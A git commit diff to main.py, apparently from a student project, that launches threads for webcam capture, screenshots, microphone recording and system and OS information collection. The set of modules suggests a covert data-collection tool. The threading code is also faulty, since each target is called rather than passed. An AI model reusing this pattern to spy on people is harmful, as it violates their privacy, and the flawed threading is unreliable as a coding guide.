51038a20f859d694c7c2d37d40b1f24f28db48db
Bobby <s215818@dtu.dk>
2023-07-02 05:55:55 +0200

    Threading for new feature

--- main.py
+++ main.py
@@ -12,22 +12,25 @@ def main():
 
     try:
         # Create threads for each function
-        web_camera_thread = threading.Thread(target=webcamera.webcamera())
+        webcamera_thread = threading.Thread(target=webcamera.webcamera())
         screenshots_thread = threading.Thread(target=screenshots.screenshots())
         microphone_thread = threading.Thread(target=microphone.microphone())
         system_information_thread = threading.Thread(target=system_information.system_information())
+        os_version_thread = threading.Thread(target=system_information.os_version())
 
         # Start the threads
-        web_camera_thread.start()
+        webcamera_thread.start()
         screenshots_thread.start()
         microphone_thread.start()
         system_information_thread.start()
+        os_version_thread.start()
 
         # Wait for all threads to finish
-        web_camera_thread.join()
+        webcamera_thread.join()
         screenshots_thread.join()
         microphone_thread.join()
         system_information_thread.join()
+        os_version_thread.join()
 
     except Exception as e:
         raise MainFileException("Main failed to run") from e
